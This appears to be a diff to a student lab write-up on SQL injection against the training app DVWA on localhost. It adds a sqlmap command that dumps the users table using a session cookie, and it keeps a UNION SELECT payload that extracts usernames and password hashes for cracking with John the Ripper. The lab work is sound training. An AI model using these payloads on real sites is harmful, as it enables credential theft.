@@ -263,7 +263,14 @@ Result
 **Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
 <br>
 **Answer 3**:
-### 1. Attack by sqlinjection code
+### 1. Attack by sqlinjection code or sqlmap
+### 1.1 Attack by sqlmap
+```
+python sqlmap.py -u "http://localhost:4280/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=d36a2766916be89ecb1e34c02b94f95c; security=low" -D dvwa -T users --dump
+```
+![image](https://github.com/user-attachments/assets/bf35e4a2-632a-4bcc-90f3-cf9b550dc037)
+
+### 1.2 Attack by sqlinjection code
 ```
 ' UNION SELECT user, password FROM users #
 ```
